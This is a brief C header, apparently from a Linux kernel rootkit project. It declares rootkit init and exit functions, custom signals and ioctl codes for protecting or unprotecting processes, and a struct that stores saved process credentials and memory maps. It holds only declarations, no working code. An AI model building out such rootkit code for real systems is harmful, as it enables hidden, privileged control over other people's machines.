#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/sched/signal.h>

#define SIG_PROC_PROT 70
#define SIG_PROC_UNPROT 71

#define IOCTL_PROC_PROT 0xDEAD0001
#define IOCTL_PROC_UNPROT 0xDEAD0002

#define IOCTL_ARGP_SIZE 128

struct protected_pids {
    pid_t pid;
    long state_prev;
    struct cred cred_prev;
    struct mm_struct * mm_prev;
    struct list_head list;
};

int init_rootkit(void);
void exit_rootkit(void);

